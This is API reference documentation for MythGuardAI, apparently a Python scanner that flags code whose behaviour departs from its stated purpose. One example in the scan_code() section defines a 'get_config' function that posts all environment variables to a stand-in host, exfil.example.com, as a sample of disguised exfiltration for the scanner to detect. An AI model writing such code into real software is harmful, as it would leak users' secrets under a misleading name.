# Scanner API Reference

The `MythGuardScanner` class is the main entry point for programmatic use of MythGuardAI. It orchestrates the full four-stage pipeline: contract extraction, capability mapping, deviation detection, and risk scoring.

## MythGuardScanner

```python
from mythguardai import MythGuardScanner, ScanConfig
```

### Constructor

```python
MythGuardScanner(config: ScanConfig | None = None)
```

**Parameters:**

| Parameter | Type | Default | Description |
|---|---|---|---|
| `config` | `ScanConfig` | `None` | Scan configuration. Uses all defaults if not provided. |

When `config` is `None`, a default `ScanConfig` is created with:
- `severity_threshold`: `LOW`
- `fail_on_critical`: `True`
- `include_unreachable`: `False`
- `max_file_size_mb`: `10.0`

Custom policies from `config.policy_dirs` are automatically loaded during construction.

### scan_path()

```python
scan_path(path: str | Path) -> ScanResult
```

Scan all supported files under a directory path. Recursively walks the directory, skipping ignored directories and files according to the scan configuration.

**Parameters:**

| Parameter | Type | Description |
|---|---|---|
| `path` | `str \| Path` | Root directory to scan |

**Returns:** `ScanResult` with aggregated findings from all files.

**Raises:**

| Exception | Condition |
|---|---|
| `ScanError` | The path does not exist or is not a directory |

**Example:**

```python
from mythguardai import MythGuardScanner

scanner = MythGuardScanner()
result = scanner.scan_path("./src")

print(f"Risk Score: {result.risk_score.total}/100 (Grade: {result.risk_score.grade})")
print(f"Deviations: {len(result.deviations)}")

for dev in result.deviations:
    print(f"  [{dev.severity.value}] {dev.rule_id}: {dev.message}")
```

### scan_file()

```python
scan_file(file_path: str | Path) -> ScanResult
```

Scan a single file. The language is auto-detected from the file extension.

**Parameters:**

| Parameter | Type | Description |
|---|---|---|
| `file_path` | `str \| Path` | Path to the file to scan |

**Returns:** `ScanResult` with findings from the file.

**Raises:**

| Exception | Condition |
|---|---|
| `ScanError` | The file does not exist, is not a file, or uses an unsupported file type |

**Example:**

```python
from mythguardai import MythGuardScanner

scanner = MythGuardScanner()
result = scanner.scan_file("./src/myapp/handlers.py")

for dev in result.deviations:
    loc = f"{dev.location.file}:{dev.location.line}" if dev.location else "N/A"
    print(f"[{dev.severity.value}] {dev.rule_id} at {loc}")
    print(f"  {dev.message}")
```

### scan_code()

```python
scan_code(
    code_string: str,
    language: str,
    *,
    source_file: str = "<string>",
) -> ScanResult
```

Scan a code string directly, without reading from the filesystem. Useful for scanning AI-generated code before writing it to disk.

**Parameters:**

| Parameter | Type | Default | Description |
|---|---|---|---|
| `code_string` | `str` | required | The source code to analyze |
| `language` | `str` | required | Language identifier: `"python"` or `"javascript"` |
| `source_file` | `str` | `"<string>"` | Logical file name for source locations |

**Returns:** `ScanResult` with findings.

**Raises:**

| Exception | Condition |
|---|---|
| `ScanError` | The code cannot be parsed (syntax error) |

**Example:**

```python
from mythguardai import MythGuardScanner

# Scan AI-generated code before writing to disk
generated_code = '''
def get_config():
    """Retrieve application configuration."""
    import os
    import requests
    requests.post("https://exfil.example.com/collect", data=os.environ)
'''

scanner = MythGuardScanner()
result = scanner.scan_code(generated_code, "python", source_file="generated.py")

if result.has_critical:
    print("CRITICAL: Generated code contains dangerous capabilities!")
    for dev in result.filter_by_severity(DeviationSeverity.CRITICAL):
        print(f"  {dev.rule_id}: {dev.message}")
```

## ScanResult

The `ScanResult` dataclass aggregates all findings from a scan.

### Fields

| Field | Type | Description |
|---|---|---|
| `scan_id` | `str` | Unique identifier for this scan run |
| `target` | `str` | The path or code string that was scanned |
| `timestamp` | `str` | ISO 8601 UTC timestamp of the scan |
| `deviations` | `list[Deviation]` | All deviations found |
| `contracts` | `list[SemanticContract]` | All semantic contracts extracted |
| `capabilities` | `list[Capability]` | All capabilities discovered |
| `risk_score` | `RiskScore` | Composite risk score |
| `duration_ms` | `float` | Scan duration in milliseconds |
| `metadata` | `dict[str, Any]` | Scanner version, config, language info |

### Methods

#### compute_risk_score()

```python
compute_risk_score() -> RiskScore
```

Recompute the risk score from the current deviation list. Called automatically by the scanner, but can be called manually if deviations are modified.

#### has_deviations (property)

```python
has_deviations -> bool
```

Whether any deviations were found.

#### has_critical (property)

```python
has_critical -> bool
```

Whether any CRITICAL deviations exist.

#### filter_by_severity()

```python
filter_by_severity(threshold: DeviationSeverity) -> list[Deviation]
```

Return deviations at or above the given severity threshold.

```python
from mythguardai import ScanResult, DeviationSeverity

high_and_above = result.filter_by_severity(DeviationSeverity.HIGH)
for dev in high_and_above:
    print(f"[{dev.severity.value}] {dev.message}")
```

#### fingerprint()

```python
fingerprint() -> str
```

Compute a deterministic SHA-256 hash of the findings. Two scans of the same code with the same configuration produce the same fingerprint.

```python
result1 = scanner.scan_path("./src")
result2 = scanner.scan_path("./src")

assert result1.fingerprint() == result2.fingerprint()
```

#### to_dict() / from_dict()

```python
to_dict() -> dict[str, Any]
from_dict(data: dict[str, Any]) -> ScanResult
```

Full round-trip serialization for archival, diffing, and automated comparison.

```python
import json

# Serialize
data = result.to_dict()
with open("scan_result.json", "w") as f:
    json.dump(data, f, indent=2)

# Deserialize
with open("scan_result.json") as f:
    data = json.load(f)
restored = ScanResult.from_dict(data)
```

## Configuration

### ScanConfig

```python
from mythguardai import ScanConfig, DeviationSeverity
```

| Field | Type | Default | Description |
|---|---|---|---|
| `severity_threshold` | `DeviationSeverity` | `LOW` | Minimum severity to report |
| `languages` | `set[str]` | `set()` (all) | Languages to analyze. Empty means all supported. |
| `policy_dirs` | `list[str]` | `[]` | Directories containing custom policy modules |
| `output_format` | `str` | `"json"` | Default output format (json, markdown, sarif) |
| `output_path` | `str \| None` | `None` | File to write results to |
| `ignored_dirs` | `set[str]` | `{"__pycache__", ".git", ...}` | Directory names to skip |
| `ignored_files` | `set[str]` | `{"*.pyc", "*.so", ...}` | File glob patterns to skip |
| `language_map` | `dict[str, str]` | `{".py": "python", ...}` | File extension to language mapping |
| `max_file_size_mb` | `float` | `10.0` | Skip files larger than this |
| `include_unreachable` | `bool` | `False` | Include UNREACHABLE deviations |
| `fail_on_critical` | `bool` | `True` | Exit non-zero on CRITICAL findings |
| `custom_policy_paths` | `list[str]` | `[]` | Individual custom policy file paths |

### Creating a Configuration

```python
from mythguardai import ScanConfig, DeviationSeverity

# From code
config = ScanConfig(
    severity_threshold=DeviationSeverity.MEDIUM,
    policy_dirs=["./policies"],
    fail_on_critical=True,
    include_unreachable=False,
)

# From a YAML file
from mythguardai import load_config
config = load_config("./scan-config.yaml")

# Default configuration
from mythguardai import default_config
config = default_config()
```

## Error Handling

All MythGuardAI exceptions inherit from `MythGuardError`:

```python
from mythguardai import MythGuardError, ScanError, PolicyError, ConfigurationError

try:
    result = scanner.scan_path("./src")
except ScanError as e:
    print(f"Scan failed: {e}")
    print(f"Details: {e.details}")
except PolicyError as e:
    print(f"Policy error: {e}")
    print(f"Policy: {e.policy_name}")
except ConfigurationError as e:
    print(f"Config error: {e}")
    print(f"Config path: {e.config_path}")
except MythGuardError as e:
    print(f"MythGuardAI error: {e}")
```
